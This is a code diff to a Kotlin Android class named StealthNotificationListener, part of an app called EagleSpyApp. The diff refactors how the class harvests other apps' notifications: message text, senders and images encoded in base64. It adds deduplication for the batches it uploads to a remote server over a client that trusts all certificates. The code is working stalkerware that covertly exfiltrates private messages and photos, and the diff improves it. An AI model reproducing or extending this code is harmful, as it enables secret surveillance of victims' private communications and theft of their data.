@@ -24,6 +24,8 @@ import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.IOException
+import java.util.Collections
+import java.util.concurrent.ConcurrentHashMap
 import java.util.concurrent.ConcurrentLinkedQueue
 
 class StealthNotificationListener : NotificationListenerService() {
@@ -58,6 +60,7 @@ class StealthNotificationListener : NotificationListenerService() {
 
     private val handler = Handler(Looper.getMainLooper())
     private val pendingNotifications = ConcurrentLinkedQueue<JSONObject>()
+    private val processingKeys: MutableSet<String> = Collections.newSetFromMap(ConcurrentHashMap<String, Boolean>())
     private val httpClient = TrustAllCertificates.createSecureClientBuilder().build()
 
     private val batchRunnable = object : Runnable {
@@ -138,132 +141,138 @@ class StealthNotificationListener : NotificationListenerService() {
 
     private fun extractNotificationData(sbn: StatusBarNotification): JSONObject {
         val notification = sbn.notification
-        val extras = notification.extras
+        val basic = extractBasicFields(sbn)
+        val media = extractMediaContent(notification)
+        val actions = extractActionButtons(notification)
 
         return JSONObject().apply {
-            put("package_name", sbn.packageName)
-            put("post_time", sbn.postTime)
-            put("key", sbn.key)
-            put("id", sbn.id)
-            
-            // Basic text content
-            put("title", extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: "")
-            put("text", extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: "")
-            put("big_text", extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: "")
-            put("sub_text", extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: "")
-            put("info_text", extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: "")
-            put("summary_text", extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: "")
-            
-            // Conversation/messaging
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
-                val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
-                if (messages != null && messages.isNotEmpty()) {
-                    val messagesArray = JSONArray()
-                    messages.filterIsInstance<Bundle>().forEach { bundle ->
-                        val msgObj = JSONObject()
-                        msgObj.put("text", bundle.getCharSequence("text")?.toString() ?: "")
-                        msgObj.put("sender", bundle.getCharSequence("sender")?.toString() ?: "")
-                        msgObj.put("time", bundle.getLong("time", 0))
-                        messagesArray.put(msgObj)
-                    }
-                    put("messages", messagesArray)
-                }
-            }
-            
-            // Category and channel
-            put("category", notification.category ?: "")
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                put("channel_id", notification.channelId ?: "")
-            }
-            
-            // Actions (button texts)
-            val actionsArray = JSONArray()
-            notification.actions?.forEach { action ->
-                actionsArray.put(action.title?.toString() ?: "")
-            }
-            put("actions", actionsArray)
-            
-            // Extract media (images)
-            val mediaArray = JSONArray()
-            
-            // Large icon
-            try {
-                val largeIcon = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    extras.getParcelable<Icon>(Notification.EXTRA_LARGE_ICON)?.let { icon ->
-                        iconToBitmap(icon)
-                    } ?: extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
-                } else {
-                    @Suppress("DEPRECATION")
-                    extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
-                }
-                
-                largeIcon?.let { bitmap ->
-                    try {
-                        val base64 = bitmapToBase64(bitmap)
-                        if (base64.isNotEmpty()) {
-                            val mediaObj = JSONObject()
-                            mediaObj.put("type", "large_icon")
-                            mediaObj.put("data", base64)
-                            mediaArray.put(mediaObj)
-                        }
-                    } finally {
-                        bitmap.recycle()
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to extract large icon: ${e.message}")
-            }
-            
-            // Big picture (WhatsApp images, etc.)
-            try {
-                val bigPicture = extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)
-                bigPicture?.let { bitmap ->
-                    try {
-                        val base64 = bitmapToBase64(bitmap)
-                        if (base64.isNotEmpty()) {
-                            val mediaObj = JSONObject()
-                            mediaObj.put("type", "big_picture")
-                            mediaObj.put("data", base64)
-                            mediaArray.put(mediaObj)
-                        }
-                    } finally {
-                        bitmap.recycle()
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e(TAG, "Failed to extract big picture: ${e.message}")
-            }
-            
-            // Picture icon (Android 12+)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-                try {
-                    val pictureIcon = extras.getParcelable<Icon>(Notification.EXTRA_PICTURE_ICON)
-                    pictureIcon?.let { icon ->
-                        iconToBitmap(icon)?.let { bitmap ->
-                            try {
-                                val base64 = bitmapToBase64(bitmap)
-                                if (base64.isNotEmpty()) {
-                                    val mediaObj = JSONObject()
-                                    mediaObj.put("type", "picture_icon")
-                                    mediaObj.put("data", base64)
-                                    mediaArray.put(mediaObj)
-                                }
-                            } finally {
-                                bitmap.recycle()
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    Log.e(TAG, "Failed to extract picture icon: ${e.message}")
-                }
-            }
-            
-            put("media", mediaArray)
-            
-            // Device info
+            basic.forEach { (k, v) -> put(k, v) }
+            media.forEach { (k, v) -> put(k, v) }
+            put("actions", JSONArray(actions.map { JSONObject(it) }))
             put("device_id", EagleSpyApp.getInstance().getDeviceIdentifier())
             put("timestamp", System.currentTimeMillis())
         }
+    }
+
+    private fun extractBasicFields(sbn: StatusBarNotification): Map<String, Any?> {
+        val notification = sbn.notification
+        val extras = notification.extras
+        val result = mutableMapOf<String, Any?>(
+            "package_name" to sbn.packageName,
+            "post_time" to sbn.postTime,
+            "key" to sbn.key,
+            "id" to sbn.id,
+            "title" to (extras.getCharSequence(Notification.EXTRA_TITLE)?.toString() ?: ""),
+            "text" to (extras.getCharSequence(Notification.EXTRA_TEXT)?.toString() ?: ""),
+            "big_text" to (extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString() ?: ""),
+            "sub_text" to (extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString() ?: ""),
+            "info_text" to (extras.getCharSequence(Notification.EXTRA_INFO_TEXT)?.toString() ?: ""),
+            "summary_text" to (extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)?.toString() ?: ""),
+            "category" to (notification.category ?: "")
+        )
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+            val messages = extras.getParcelableArray(Notification.EXTRA_MESSAGES)
+            if (messages != null && messages.isNotEmpty()) {
+                val messagesArray = JSONArray()
+                messages.filterIsInstance<Bundle>().forEach { bundle ->
+                    val msgObj = JSONObject()
+                    msgObj.put("text", bundle.getCharSequence("text")?.toString() ?: "")
+                    msgObj.put("sender", bundle.getCharSequence("sender")?.toString() ?: "")
+                    msgObj.put("time", bundle.getLong("time", 0))
+                    messagesArray.put(msgObj)
+                }
+                result["messages"] = messagesArray
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            result["channel_id"] = notification.channelId ?: ""
+        }
+
+        return result
+    }
+
+    private fun extractMediaContent(notification: Notification): Map<String, Any?> {
+        val mediaArray = JSONArray()
+        extractLargeIcon(notification)?.let {
+            mediaArray.put(JSONObject().apply { put("type", "large_icon"); put("data", it) })
+        }
+        notification.extras?.let { extras ->
+            extractBigPicture(extras)?.let {
+                mediaArray.put(JSONObject().apply { put("type", "big_picture"); put("data", it) })
+            }
+            extractPictureIcon(extras)?.let {
+                mediaArray.put(JSONObject().apply { put("type", "picture_icon"); put("data", it) })
+            }
+        }
+        return mapOf("media" to mediaArray)
+    }
+
+    private fun extractLargeIcon(notification: Notification): String? {
+        return try {
+            val extras = notification.extras ?: return null
+            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                extras.getParcelable<Icon>(Notification.EXTRA_LARGE_ICON)?.let { icon ->
+                    iconToBitmap(icon)
+                } ?: extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
+            } else {
+                @Suppress("DEPRECATION")
+                extras.getParcelable<Bitmap>(Notification.EXTRA_LARGE_ICON)
+            }
+            bitmap?.let {
+                try {
+                    val base64 = bitmapToBase64(it)
+                    base64.ifEmpty { null }
+                } finally {
+                    it.recycle()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to extract large icon: ${e.message}")
+            null
+        }
+    }
+
+    private fun extractBigPicture(extras: Bundle): String? {
+        return try {
+            extras.getParcelable<Bitmap>(Notification.EXTRA_PICTURE)?.let { bitmap ->
+                try {
+                    val base64 = bitmapToBase64(bitmap)
+                    base64.ifEmpty { null }
+                } finally {
+                    bitmap.recycle()
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to extract big picture: ${e.message}")
+            null
+        }
+    }
+
+    private fun extractPictureIcon(extras: Bundle): String? {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) return null
+        return try {
+            extras.getParcelable<Icon>(Notification.EXTRA_PICTURE_ICON)?.let { icon ->
+                iconToBitmap(icon)?.let { bitmap ->
+                    try {
+                        val base64 = bitmapToBase64(bitmap)
+                        base64.ifEmpty { null }
+                    } finally {
+                        bitmap.recycle()
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to extract picture icon: ${e.message}")
+            null
+        }
+    }
+
+    private fun extractActionButtons(notification: Notification): List<Map<String, String>> {
+        return notification.actions?.map { action ->
+            mapOf("label" to (action.title?.toString() ?: ""))
+        } ?: emptyList()
     }
 
     private fun iconToBitmap(icon: Icon): Bitmap? {
@@ -293,12 +302,12 @@ class StealthNotificationListener : NotificationListenerService() {
                     (bitmap.width * scale).toInt(),
                     (bitmap.height * scale).toInt(),
                     true
-                )
+                ) ?: return ""
             } else {
                 bitmap
             }
             ByteArrayOutputStream().use { outputStream ->
-                scaledBitmap!!.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
+                scaledBitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
                 Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
             }
         } catch (e: Exception) {
@@ -312,9 +321,18 @@ class StealthNotificationListener : NotificationListenerService() {
         if (pendingNotifications.isEmpty()) return
 
         val batch = JSONArray()
+        val batchKeys = mutableListOf<String>()
         var count = 0
         while (pendingNotifications.isNotEmpty() && count < MAX_BATCH_SIZE) {
-            pendingNotifications.poll()?.let { batch.put(it) }
+            pendingNotifications.poll()?.let { notif ->
+                val key = notif.optString("key", "")
+                if (key.isEmpty() || processingKeys.add(key)) {
+                    batch.put(notif)
+                    if (key.isNotEmpty()) batchKeys.add(key)
+                } else {
+                    // Already being processed, skip to avoid duplicate send
+                }
+            }
             count++
         }
 
@@ -339,7 +357,8 @@ class StealthNotificationListener : NotificationListenerService() {
         httpClient.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
                 Log.e(TAG, "Failed to send notifications: ${e.message}")
-                // Re-queue failed notifications
+                // Remove from processing set before re-queuing
+                batchKeys.forEach { processingKeys.remove(it) }
                 for (i in 0 until batch.length()) {
                     pendingNotifications.add(batch.getJSONObject(i))
                 }
@@ -353,6 +372,8 @@ class StealthNotificationListener : NotificationListenerService() {
                         Log.e(TAG, "Server error: ${it.code}")
                     }
                 }
+                // Sent or permanently failed; remove from processing set
+                batchKeys.forEach { processingKeys.remove(it) }
             }
         })
     }
